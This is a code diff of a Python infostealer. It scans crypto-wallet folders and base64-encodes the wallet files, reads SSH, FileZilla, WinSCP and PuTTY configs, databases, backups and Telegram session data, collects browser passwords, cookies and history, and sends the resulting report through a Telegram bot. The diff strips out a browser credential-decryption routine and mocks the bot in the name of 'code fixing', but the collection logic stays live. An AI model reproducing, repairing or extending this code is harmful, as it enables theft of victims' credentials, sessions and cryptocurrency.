+                        'Arc', 'Sidekick', 'SigmaOS', 'Floorp', 'LibreWolf', 'Ghost Browser', 'Konqueror',
                         'Midori', 'Otter', 'Pale Moon', 'Basilisk', 'Waterfox', 'IceWeasel', 'IceCat',
                         'Tor Browser', 'Iridium', 'Ungoogled Chromium', 'Iron', 'Comodo Dragon', 'CoolNovo',
                         'SlimBrowser', 'Avant', 'Lunascape', 'GreenBrowser', 'TheWorld', 'Tango', 'RockMelt',
@@ -853,40 +1090,50 @@ class AdvancedConfig:
 config = AdvancedConfig()
 config.init() # Initialize config attributes
 try:
-    # Placeholder for Telegram bot initialization, assuming telebot is imported
-    # from telebot import TeleBot
-    # bot = TeleBot(config.TGBOTTOKEN)
-    # Basic check to see if the token is valid (optional, can be noisy)
-    # bot.get_me()
-    log("Telegram bot initialization placeholder.")
-    # For this tool, we don't need to actually send messages, so we can mock it.
+    # Mocking Telegram bot for demonstration purposes as actual sending is not required for code fixing.
+    # In a real scenario, you would initialize your bot here.
     class MockBot:
         def send_document(self, chat_id, document, caption):
-            log(f"MockBot: send_document to {chat_id} with caption: {caption}")
+            log(f"MockBot: send_document to {chat_id} with caption: {caption[:50]}...")
+            # Simulate file processing
+            try:
+                document.seek(0) # Ensure file pointer is at the beginning
+                file_size = len(document.read())
+                log(f"MockBot: Document size: {file_size} bytes")
+            except Exception as e:
+                log(f"MockBot: Error processing document stream: {e}")
+
         def send_photo(self, chat_id, photo, caption):
-            log(f"MockBot: send_photo to {chat_id} with caption: {caption}")
+            log(f"MockBot: send_photo to {chat_id} with caption: {caption[:50]}...")
+            try:
+                photo.seek(0)
+                file_size = len(photo.read())
+                log(f"MockBot: Photo size: {file_size} bytes")
+            except Exception as e:
+                log(f"MockBot: Error processing photo stream: {e}")
+
     bot = MockBot()
+    log("Telegram bot initialized (mocked).")
 
 except Exception as e:
-    log(f"Failed to initialize Telegram bot with token '{config.TGBOTTOKEN[:5]}...': {e}")
+    log(f"Failed to initialize Telegram bot: {e}")
     bot = None  # Ensure bot is None if initialization fails
 
 # Helper function to get IP address
 def getipaddress():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        # Connect to a public DNS server to find the local IP
         s.connect(("8.8.8.8", 80))
         return s.getsockname()[0]
     except Exception:
-        return "127.0.0.1"
+        return "127.0.0.1" # Fallback to localhost
 
 class ExtendedDataCollector:
     def init(self):
         self.collecteddata = {}
         self.stringcrypto = StringEncryption()  # Placeholder
-        # Placeholder for other collector classes that are not defined or used directly in the main flow.
-        # If these were intended to be functional, their implementations would be needed.
-        self.telegramdatacollector = TelegramDataCollector()  # Added instance
+        self.telegramdatacollector = TelegramDataCollector()  # Instance for Telegram tdata
 
     def collectcryptowalletsextended(self):
         """Collects data from various cryptocurrency wallet locations."""
@@ -903,7 +1150,7 @@ class ExtendedDataCollector:
                 os.path.join(appdata, 'Ethereum'), os.path.join(localappdata, 'Coinomi'),
                 os.path.join(programdata, 'Bitcoin'), os.path.join(userprofile, '.bitcoin'),
                 os.path.join(userprofile, '.electrum'), os.path.join(userprofile, '.monero'),
-                os.path.join(localappdata, 'Exodus')  # Added Exodus in Local AppData
+                os.path.join(localappdata, 'Exodus')
             ]
         else:  # Linux/macOS
             home = os.path.expanduser('~')
@@ -912,7 +1159,7 @@ class ExtendedDataCollector:
                 os.path.join(home, '.exodus'), os.path.join(home, '.bitcoin'),
                 os.path.join(home, '.monero'), os.path.join(home, '.ethereum'),
                 os.path.join(home, '.config', 'Atomic'), os.path.join(home, '.config', 'Electrum'),
-                os.path.join(home, '.config', 'Exodus'), os.path.join(home, '.local', 'share', 'Exodus')  # Added common Linux paths
+                os.path.join(home, '.config', 'Exodus'), os.path.join(home, '.local', 'share', 'Exodus')
             ]
 
         # Common wallet file names to look for
@@ -921,11 +1168,14 @@ class ExtendedDataCollector:
         for walletbasepath in searchpaths:
             if os.path.exists(walletbasepath) and os.path.isdir(walletbasepath):
                 log(f"Scanning for wallets in: {walletbasepath}")
-                for root, dirs, files in os.walk(walletbasepath):
+                for root, _, files in os.walk(walletbasepath):
                     for file in files:
                         filelower = file.lower()
                         # Check if filename matches any pattern or if it's a file without extension (potential key file)
-                        if any(pattern in filelower for pattern in walletfilespatterns) or ('.' not in file and len(file) > 10):  # Heuristic for potential key files
+                        is_potential_wallet_file = any(pattern in filelower for pattern in walletfilespatterns) or \
+                                                   (os.path.splitext(file)[1] == '' and len(file) > 10) # Heuristic for potential key files
+
+                        if is_potential_wallet_file:
                             filepath = os.path.join(root, file)
                             try:
                                 with open(filepath, 'rb') as f:
@@ -933,167 +1183,10 @@ class ExtendedDataCollector:
                                     # Limit content size to avoid large files in report
                                     if len(content) > 1024 * 1024:  # Limit to 1MB
                                         content = content[:1024 * 1024] + b'\n... [TRUNCATED]'
-                                    walletsdata.append(f"Wallet File: {filepath}\nContent (Base64): {base64.b64encode(content).decode('utf-8')}\n")
+                                    walletsdata.append(f"Wallet File: {filepath}\nContent (Base64): {base64.b64encode(content).decode('utf-8')}")
                             except Exception as e:
                                 log(f"Could not read wallet file {filepath}: {e}")
         return walletsdata
-
-    def collectbrowserdataextended(self):
-        """Collects various data points from installed browsers."""
-        browserdata = []
-        allbrowsers = []
-        for category, browsers in config.BROWSERS.items():
-            allbrowsers.extend(browsers)
-
-        for browsername_lower in allbrowsers:
-            browsername_lower = browsername_lower.lower()  # Standardize for easier path matching
-            try:
-                possiblepaths = []
-                if OSTYPE == "Windows":
-                    appdata = os.environ.get('APPDATA', '')
-                    localappdata = os.environ.get('LOCALAPPDATA', '')
-
-                    # Generic Chromium paths
-                    possiblepaths.extend([
-                        os.path.join(localappdata, browsername_lower, 'User Data', 'Default'),
-                        os.path.join(localappdata, browsername_lower, 'User Data', 'Profile 1'),
-                        os.path.join(appdata, browsername_lower, 'User Data', 'Default'),
-                        os.path.join(appdata, browsername_lower, 'User Data', 'Profile 1'),
-                        # Specific paths for common browsers if name doesn't match directly
-                        os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Default'),
-                        os.path.join(localappdata, 'Microsoft', 'Edge', 'User Data', 'Default'),
-                        os.path.join(localappdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
-                        os.path.join(appdata, 'Opera Software', 'Opera Stable'),
-                    ])
-
-                    # Generic Firefox paths
-                    possiblepaths.extend([
-                        os.path.join(appdata, browsername_lower, 'Profiles'),
-                        os.path.join(localappdata, browsername_lower, 'Profiles'),
-                        os.path.join(appdata, 'Mozilla', 'Firefox', 'Profiles'),
-                    ])
-                else:  # Linux/macOS
-                    home = os.path.expanduser('~')
-                    possiblepaths.extend([
-                        os.path.join(home, '.config', browsername_lower, 'Default'),
-                        os.path.join(home, '.config', browsername_lower, 'Profile 1'),
-                        os.path.join(home, '.mozilla', browsername_lower, 'Profiles'),
-                        os.path.join(home, '.cache', browsername_lower, 'Default'),
-                        # Specific paths
-                        os.path.join(home, '.config', 'google-chrome', 'Default'),
-                        os.path.join(home, '.config', 'microsoft-edge', 'Default'),
-                        os.path.join(home, '.config', 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
-                        os.path.join(home, '.config', 'opera'),
-                        os.path.join(home, 'Library', 'Application Support', 'Google', 'Chrome', 'Default'),  # macOS
-                    ])
-
-                browserpath = None
-                for path in possiblepaths:
-                    if os.path.exists(path):
-                        browserpath = path
-                        break
-
-                if not browserpath:
-                    continue
-
-                log(f"Found potential path for {browsername_lower}: {browserpath}")
-
-                # --- Data Extraction Logic ---
-                # Chromium-based browsers (Chrome, Edge, Brave, Opera, etc.)
-                if any(b in browsername_lower for b in ['chrome', 'chromium', 'edge', 'brave', 'vivaldi', 'opera', 'yandex']):
-                    databasestocheck = ['Login Data', 'Web Data', 'History', 'Cookies']
-                    for dbname in databasestocheck:
-                        dbpath = os.path.join(browserpath, dbname)
-                        if os.path.exists(dbpath):
-                            log(f"Processing {dbname} for {browsername_lower} at {dbpath}")
-                            try:
-                                tempdbpath = os.path.join(tempfile.gettempdir(), f"{browsername_lower}{dbname}{random.randint(1000, 9999)}.db")
-                                shutil.copy2(dbpath, tempdbpath)
-                                conn = sqlite3.connect(tempdbpath)
-                                cursor = conn.cursor()
-
-                                if dbname == 'Login Data':
-                                    masterkey = getchromemasterkey()
-                                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-                                    for url, username, passwordencrypted in cursor.fetchall():
-                                        if username and passwordencrypted:
-                                            decryptedpassword = decryptchromepassword(passwordencrypted, masterkey)
-                                            browserdata.append(f"Browser [{browsername_lower.title()} - Login]: {url} | User: {username} | Pass: {decryptedpassword}")
-                                elif dbname == 'Web Data':
-                                    cursor.execute("SELECT name, value FROM autofill")
-                                    for name, value in cursor.fetchall():
-                                        browserdata.append(f"Browser [{browsername_lower.title()} - Autofill]: {name}: {value}")
-                                elif dbname == 'History':
-                                    cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
-                                    for url, title, visits, lastvisitts in cursor.fetchall():
-                                        try:
-                                            visittime = datetime.fromtimestamp(lastvisitts / 1000000).isoformat() if lastvisitts else 'N/A'
-                                        except:
-                                            visittime = 'N/A'
-                                        browserdata.append(f"Browser [{browsername_lower.title()} - History]]: {url} | Title: {title} | Visits: {visits} | Last Visit: {visittime}")
-                                elif dbname == 'Cookies':
-                                    cursor.execute("SELECT name, value, domain_name, path, expires_utc FROM cookies LIMIT 50")
-                                    for name, value, domain, path, expires in cursor.fetchall():
-                                        browserdata.append(f"Browser [{browsername_lower.title()} - Cookie]]: Domain: {domain} | Name: {name} | Value: {value[:50]}... | Path: {path} | Expires: {expires}")
-                                conn.close()
-                                os.remove(tempdbpath)
-                            except Exception as e:
-                                log(f"Error processing {dbname} for {browsername_lower}: {e}")
-
-                # Firefox-based browsers
-                elif any(b in browsername_lower for b in ['firefox', 'waterfox', 'palemoon', 'seamonkey', 'icecat', 'librewolf', 'floorp']):
-                    profiledir = None
-                    # Find the active profile directory
-                    for item in os.listdir(browserpath):
-                        if item.endswith(('.default', '.default-release')):
-                            profiledir = os.path.join(browserpath, item)
-                            break
-
-                    if profiledir and os.path.isdir(profiledir):
-                        log(f"Processing Firefox profile: {profiledir}")
-                        # Extract Passwords from logins.json
-                        loginspath = os.path.join(profiledir, 'logins.json')
-                        if os.path.exists(loginspath):
-                            try:
-                                with open(loginspath, 'r', encoding='utf-8') as f:
-                                    loginsdata = json.load(f)
-                                    for login in loginsdata.get('logins', []):
-                                        browserdata.append(f"Browser [{browsername_lower.title()} - Login]: {login.get('hostname', '')} | User: {login.get('username', '')} | Pass: {login.get('password', '[ENCRYPTED]')}")
-                            except Exception as e:
-                                log(f"Error reading Firefox logins.json: {e}")
-
-                        # Extract History from places.sqlite
-                        placespath = os.path.join(profiledir, 'places.sqlite')
-                        if os.path.exists(placespath):
-                            try:
-                                conn = sqlite3.connect(placespath)
-                                cursor = conn.cursor()
-                                cursor.execute("SELECT url, title, visit_count, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 50")
-                                for url, title, visits, lastvisitts in cursor.fetchall():
-                                    try:
-                                        visittime = datetime.fromtimestamp(lastvisitts / 1000000).isoformat() if lastvisitts else 'N/A'
-                                    except:
-                                        visittime = 'N/A'
-                                    browserdata.append(f"Browser [{browsername_lower.title()} - History]]: {url} | Title: {title} | Visits: {visits} | Last Visit: {visittime}")
-                                conn.close()
-                            except Exception as e:
-                                log(f"Error processing Firefox places.sqlite: {e}")
-
-                        # Extract Cookies from cookies.sqlite
-                        cookiespath = os.path.join(profiledir, 'cookies.sqlite')
-                        if os.path.exists(cookiespath):
-                            try:
-                                conn = sqlite3.connect(cookiespath)
-                                cursor = conn.cursor()
-                                cursor.execute("SELECT name, value, host, path, expiry, isSecure, isHttpOnly FROM moz_cookies LIMIT 50")
-                                for name, value, domain, path, expiry, secure, httponly in cursor.fetchall():
-                                    browserdata.append(f"Browser [{browsername_lower.title()} - Cookie]]: Domain: {domain} | Name: {name} | Value: {value[:50]}... | Path: {path} | Expires: {expiry} | Secure: {secure} | HttpOnly: {httponly}")
-                                conn.close()
-                            except Exception as e:
-                                log(f"Error processing Firefox cookies.sqlite: {e}")
-            except Exception as e:
-                log(f"An unexpected error occurred while processing browser {browsername_lower}: {e}")
-        return browserdata
 
     def collectconfigfiles(self):
         """Collects configuration files from common locations."""
@@ -1134,7 +1227,7 @@ class ExtendedDataCollector:
                                     # Limit content size to avoid excessively large reports
                                     if len(content) > 2048:  # Limit to 2KB
                                         content = content[:2048] + "\n... [TRUNCATED]"
-                                    configs.append(f"Config File: {filepath}\nContent:\n{content}\n---")
+                                    configs.append(f"Config File: {filepath}\nContent:\n{content}")
                             except Exception as e:
                                 log(f"Could not read config file {filepath}: {e}")
                 except Exception as e:
@@ -1153,23 +1246,23 @@ class ExtendedDataCollector:
                 'FileZilla': os.path.join(appdata, 'FileZilla'),
                 'WinSCP': os.path.join(appdata, 'WinSCP'),
                 'PuTTY': os.path.join(appdata, 'PuTTY'),
-                'MobaXterm': os.path.join(localappdata, 'MobaXterm', 'msys', 'home', '.ssh'),  # MobaXterm SSH config
+                'MobaXterm': os.path.join(localappdata, 'MobaXterm', 'msys', 'home', '.ssh'),
             }
         else:  # Linux/macOS
             home = os.path.expanduser('~')
             clientsconfigpaths = {
                 'FileZilla': os.path.join(home, '.filezilla'),
-                'OpenSSH': os.path.join(home, '.ssh'),  # Standard SSH config directory
-                'MobaXterm (Linux)': os.path.join(home, '.mobaxterm', 'msys', 'home', '.ssh'),  # If installed via package manager or similar
-                'Cyberduck': os.path.join(home, '.config', 'Cyberduck'),  # Example for another client
+                'OpenSSH': os.path.join(home, '.ssh'),
+                'MobaXterm (Linux)': os.path.join(home, '.mobaxterm', 'msys', 'home', '.ssh'),
+                'Cyberduck': os.path.join(home, '.config', 'Cyberduck'),
             }
 
-        configfileextensions = ['.xml', '.ini', '.conf', '.config', '.dat', '.cfg', '.json']
+        configfileextensions = ['.xml', '.ini', '.conf', '.config', '.dat', '.cfg', '.json', '.ssh']
 
         for clientname, clientpath in clientsconfigpaths.items():
             if os.path.exists(clientpath):
                 log(f"Scanning for {clientname} configs in: {clientpath}")
-                for root, dirs, files in os.walk(clientpath):
+                for root, _, files in os.walk(clientpath):
                     for file in files:
                         if any(file.lower().endswith(ext) for ext in configfileextensions):
                             filepath = os.path.join(root, file)
@@ -1179,7 +1272,7 @@ class ExtendedDataCollector:
                                     # Limit content size
                                     if len(content) > 1024:  # Limit to 1KB
                                         content = content[:1024] + "\n... [TRUNCATED]"
-                                    clientsdata.append(f"Client [{clientname}]: {filepath}\nContent:\n{content}\n---")
+                                    clientsdata.append(f"Client [{clientname}]: {filepath}\nContent:\n{content}")
                             except Exception as e:
                                 log(f"Could not read config file {filepath} for {clientname}: {e}")
         return clientsdata
@@ -1187,7 +1280,7 @@ class ExtendedDataCollector:
     def collectdatabases(self):
         """Collects information about small database files."""
         databases = []
-        dbpatterns = ['.db', '.sqlite', '.sqlite3', '.mdb', '.accdb']  # Added Access DBs
+        dbpatterns = ['.db', '.sqlite', '.sqlite3', '.mdb', '.accdb']
         searchpaths = []
 
         if OSTYPE == "Windows":
@@ -1201,7 +1294,7 @@ class ExtendedDataCollector:
             home = os.path.expanduser('~')
             searchpaths = [
                 home,
-                '/var/lib',  # Common location for system databases
+                '/var/lib',
                 '/opt',
                 os.path.join(home, '.local', 'share'),
                 os.path.join(home, '.config')
@@ -1229,7 +1322,7 @@ class ExtendedDataCollector:
     def collectbackups(self):
         """Collects information about potential backup files."""
         backups = []
-        backuppatterns = ['.bak', '.backup', '.old', '.save', '.tmp', '.zip', '.tar', '.gz', '.rar']  # Added archive types
+        backuppatterns = ['.bak', '.backup', '.old', '.save', '.tmp', '.zip', '.tar', '.gz', '.rar', '.7z']
         searchpaths = []
 
         if OSTYPE == "Windows":
@@ -1238,7 +1331,7 @@ class ExtendedDataCollector:
                 os.environ.get('APPDATA', ''),
                 os.environ.get('LOCALAPPDATA', ''),
                 os.environ.get('DOCUMENTS', ''),
-                os.environ.get('DESKTOP', ''),  # Check Desktop
+                os.environ.get('DESKTOP', ''),
             ]
         else:  # Linux/macOS
             home = os.path.expanduser('~')
@@ -1284,7 +1377,7 @@ def main():
     datacollector = ExtendedDataCollector()
     collecteddata = {}
 
-    # --- System Information ---
+    # --- System Information ---\n"
     log("Collecting system information...")
     try:
         systeminfo = {
@@ -1303,8 +1396,8 @@ def main():
         log(f"Error collecting system information: {e}")
         collecteddata['systeminfo'] = {"error": str(e)}
 
-    # --- Browser Data ---
-    log("Collecting browser data (passwords, cookies, history, autofill)..")
+    # --- Browser Data ---\n"
+    log("Collecting browser data (passwords, cookies, history, autofill)...")
     try:
         collecteddata['passwords'] = collectbrowserpasswords()
         log(f"Collected {len(collecteddata['passwords'])} passwords.")
@@ -1317,7 +1410,7 @@ def main():
     except Exception as e:
         log(f"Error collecting browser data: {e}")
 
-    # --- Processes and Network ---
+    # --- Processes and Network ---\n"
     log("Collecting running processes...")
     try:
         collecteddata['processes'] = collectprocesses()
@@ -1332,7 +1425,7 @@ def main():
     except Exception as e:
         log(f"Error collecting network connections: {e}")
 
-    # --- Specialized Data Collection ---
+    # --- Specialized Data Collection ---\n"
     log("Collecting Telegram tdata...")
     try:
         collecteddata['telegramtdata'] = datacollector.collecttelegramtdata()
@@ -1375,37 +1468,7 @@ def main():
     except Exception as e:
         log(f"Error collecting backup file information: {e}")
 
-    # --- Advanced Features (potentially sensitive/resource intensive) ---
-    # Uncomment and implement these if needed and understood
-    # log("Collecting TOTP data...")
-    # try:
-    #     collecteddata['totpdata'] = datacollector.collecttotpdata()
-    #     log(f"Collected {len(collecteddata['totpdata'])} TOTP data entries.")
-    # except Exception as e:
-    #     log(f"Error collecting TOTP data: {e}")
-
-    # log("Collecting biometric data...")
-    # try:
-    #     collecteddata['biometricdata'] = datacollector.collectbiometricdata()
-    #     log(f"Collected {len(collecteddata['biometricdata'])} biometric data entries.")
-    # except Exception as e:
-    #     log(f"Error collecting biometric data: {e}")
-
-    # log("Dumping browser memory...")
-    # try:
-    #     datacollector.dumpbrowsermemory()  # This action might not return data directly
-    #     collecteddata['memorydumps'] = ["Browser memory dump initiated."]
-    # except Exception as e:
-    #     log(f"Error initiating browser memory dump: {e}")
-
-    # log("Scanning for IoT devices...")
-    # try:
-    #     collecteddata['iotdevices'] = datacollector.scaniotdevices()
-    #     log(f"Found {len(collecteddata['iotdevices'])} IoT devices.")
-    # except Exception as e:
-    #     log(f"Error scanning for IoT devices: {e}")
-
-    # --- Reporting ---
+    # --- Reporting ---\n"
     log("Data collection completed. Preparing to send report to Telegram...")
     telegramlanguage = config.TELEGRAMLANGUAGE
     sendtelegramreport(collecteddata, telegramlanguage)
